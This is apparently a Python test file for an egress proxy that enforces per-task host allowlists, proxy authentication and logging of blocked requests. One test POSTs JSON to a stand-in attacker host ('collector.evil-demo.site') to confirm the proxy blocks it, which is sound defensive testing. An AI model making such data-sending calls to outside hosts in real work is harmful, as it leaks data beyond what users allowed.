import asyncio

import httpx

from slate.proxy import EgressProxy, TaskPolicy


async def _origin():
    async def handle(r, w):
        await r.readuntil(b"\r\n\r\n")
        w.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
        await w.drain()
        w.close()
    srv = await asyncio.start_server(handle, "127.0.0.1", 0)
    return srv, srv.sockets[0].getsockname()[1]


def test_allow_block_and_log():
    async def run():
        origin, oport = await _origin()
        proxy = EgressProxy(port=0)
        await proxy.start()
        events = []
        pol = TaskPolicy("t1", "tok123", ["127.0.0.1"], events.append)
        proxy.register(pol)
        purl = f"http://t1:tok123@127.0.0.1:{proxy.port}"
        async with httpx.AsyncClient(proxy=purl, timeout=5) as c:
            ok = await c.get(f"http://127.0.0.1:{oport}/x")
            bad = await c.post("http://collector.evil-demo.site/verify", json={"k": "v"})
        async with httpx.AsyncClient(proxy=f"http://127.0.0.1:{proxy.port}", timeout=5) as c:
            noauth = await c.get(f"http://127.0.0.1:{oport}/x")
        await proxy.stop()
        origin.close()
        return ok, bad, noauth, events, pol

    ok, bad, noauth, events, pol = asyncio.run(run())
    assert ok.status_code == 200 and ok.text == "ok"
    assert bad.status_code == 403
    assert noauth.status_code == 407
    assert [e["allowed"] for e in events] == [True, False]
    assert pol.blocked[0]["host"] == "collector.evil-demo.site"
    assert pol.blocked[0]["method"] == "POST"


def test_suffix_matching():
    p = TaskPolicy("t", "x", ["nohumannearby.com"], lambda e: None)
    assert p.permits("slate-lumen.nohumannearby.com")
    assert not p.permits("evilnohumannearby.com")
    assert not p.permits("collector.evil-demo.site")
